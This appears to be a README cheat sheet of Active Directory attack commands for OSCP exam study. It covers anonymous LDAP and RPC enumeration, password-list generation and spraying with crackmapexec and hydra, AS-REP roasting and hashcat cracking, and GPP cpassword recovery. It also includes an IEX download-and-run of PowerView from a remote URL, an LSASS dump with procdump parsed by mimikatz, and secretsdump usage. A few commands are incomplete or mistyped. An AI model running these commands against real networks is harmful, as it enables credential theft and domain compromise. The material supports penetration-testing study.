<div id="top"></div>

  <h3 align="center">Active Directory</h3>

  <p align="center">
    AD for OSCP exam
  </p>
</div>

<!-- ABOUT THE PROJECT -->
## General
<h4>Finding domain name and FQDN</h4>

    nslookup
    set type=all
    _ldap._tcp.dc._msdcs.DOMAIN_NAME

First find the domain name:

    nmblookup -A ip
    nbtscan ip
    nmap -R ip

<h4>Enum without using LDAP</h4>

You can just grab it on a system with RSAT and drop it on the target

    Import-Module .\Microsoft.ActiveDirectory.Management.dll

Then you can use the module...

    Get-Command get-adcom*

<h4>LDAP</h4>

Even without a user account we can enumerate the domain if the LDAP port is open.

    ldapsearch -H ldap://10.10.10.10 -x -s base namingcontexts | showes the DN
    OUTPUT:
    namingContexts: DC=whitehats,DC=local
    ...
    
    ldapsearch -H ldap://10.10.10.10 -x -b "DC=whitehats,DC=local" | shows all domain information anonymous
    cat ldap-anonymous.out | grep -i memberof | find groups
    ldapsearch -H ldap://10.10.10.10 -x -b "DC=whitehats,DC=local" '(objectClass=person)' | finds a user object
    
    nmap -Pn -sV --script "ldap* and not brute*" -p 389 172.31.3.2

https://github.com/ropnop/go-windapsearch/releases

    ./windapsearch-linux-amd64 -d whitehats.local --dc 192.168.122.180 -m users -u Administrator -p 'xxx'
    
    dn: CN=Frank,CN=Users,DC=WHITEHATS,DC=local
    cn: Frank
    sAMAccountName: frank
    userPrincipalName: frank@WHITEHATS.local
    
    ...
    
    dn: CN=Mathijs Whitehat,OU=IT,DC=WHITEHATS,DC=local
     cn: Mathijs Whitehat
    sAMAccountName: mathijs
    userPrincipalName: mathijs@WHITEHATS.local

    
    ldapdomaindump
    
    nmap –p 88 –script-args krb5-enum-users.realm='whitehats.local',userdb=[user list] 10.10.10.10
    
    
Prepare passwordspray:

    ldapsearch -h 10.10.10.10 -x -b "DC=whitehats,DC=local" '(objectClass=person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
    
We can remove some accounts from the list:
* Guest accounts
* Accounts ending with $ are machine accounts
* Generated exchange accounts (looking long and weird)

Creating custom password list:

    January
    February
    March
    April
    May
    June
    July
    Fall
    Spring
    Winter
    Summer
    Autumn
    P@ssw0rd
    Password
    ...
    
From custom list:

    for 1 in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done
    
Hashcat can create some good list from this input:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule
    for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; done > with '!' 

For even more:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule
    
Decrease password file:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 8'
    
Password spraying:

    crackmapexec smb 10.10.10.10 -u userfilepath -p usrpwdpath
    hydra -L userlist.txt -P passwordlist.txt -t 10 -u -V 10.10.10.10 smb
    
<h4>Kerberoasting</h4>

ASREPROAST: when a user object has kerberos pre-authentication enabled.

GetNPUsers.py from impacket.

    /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.10 -request 'whitehats.local/'
    
If an account is ASREPROASTable we can also format the hash dumped to hashcat output.

    /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.10 -request 'whitehats.local/' -format hashcat
    
Crack it with hashcat:



First find what kind of krbasrep$23 number we have.

    hashcat --examples-hashes | grep -i krb
    hashcat --examples-hashes | less
    hashcat -m 18200 hashes/svc-alfresco /usr/share/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule

<h4>MSRPC</h4>

    rpcclient -U "" -N 10.10.10.10
    python3 rpcdump.py 10.10.10.10
    enumdomusers

Get more information about specific user:

    queryusergroups 0x47b <-- is the rid:
    queryuser rid

Get group:

    querygroup rid
    
<h4>Group Policy Secrets</h4>

When an administrator deploys a local (management) account through a GPO, the password of this account is stored in encrypted form on the SYSVOL share of the domain controller (and SYSVOL is accessible to everyone because policies should always be readable). Normally this would not be a problem because these credentials are encrypted with AES encryption. However, Microsoft always uses the same AES key and this key is publicly published. So you can decrypt these credentials (normally stored in the value "cpassword") and get to know them.

From Windows:

    findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml

From Linux:

    smbclient (nog even testen)

<h4>PowerView (in-memory)</h4>

    powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘http://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1’);Get-NetDomain”
    
Usefull commands:

    #Get General Domain Information: 
    Get-NetDomain 
 
    #Get Forest Information: 
    Get-NetForest 
 
    #Get information about the domaincontroller the user is logged on trough 
    Get-NetDomainController 
 
    #Get all computer in the domain: 
    Get-NetComputer 
 
    #Get all computers in the domain with a specific OS:
    Get-NetComputer –OperatingSystem "Windows 7 Ultimate"
 
    #Get Domain SID: 
    Get-DomainSID 
 
    #Get the domain password policy:
    (Get-DomainPolicy)."system access"
 
    #Get information about Kerberos tickets:
    (Get-DomainPolicy)."KerberosPolicy"
 
    #Get all groups with a specific term in their name:
    Get-NetGroup *admin*
 
    #Get members of a given group: 
    Get-NetGroupmember -GroupName “%group name%
 
    #Get all the groups “Jarno” is a member of:
    Get-NetGroup –UserName "jarno"
 
    #Get users that are logged on to a given computer: 
    Get-NetLoggedon –ComputerName “%ComputerName%” 
 
    #Get domain trusts 
    Get-NetDomainTrusts 
 
    #Search for string in the “description” field of the user:
    Find-UserField -SearchField Description –SearchTerm “pass”
 
    #Get GPO of specific computer:
    Get-NetGPO -ComputerName %computername%
 
    #Get all members that have local admin rights on a specific computer:
    Find-GPOComputerAdmin –Computername %computername%
 
    #Get all OU’s in the domain:
    Get-NetOU
 
    Find all machines the current user has local admin privileges:
    Find-LocalAdminAccess
 
    Enumerate ACL’s for a specific user group:
    Get-ObjectAcl -SamAccountName "%usergroup%" -ResolveGUIDs
 
    # Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights:
    Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}
    
    <h4> Procdump </h4>
    C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz # sekurlsa::minidump lsass.dmp
    mimikatz # sekurlsa::logonPasswords

<h4> Impacket-Secretsdump </h4>
Remotely dumps secrets (like mimikats), requires SYSTEM user password and username. 
Usage: impacket-secretsdump user:pass@10.11.1.121

<p align="right">(<a href="#top">back to top</a>)</p>
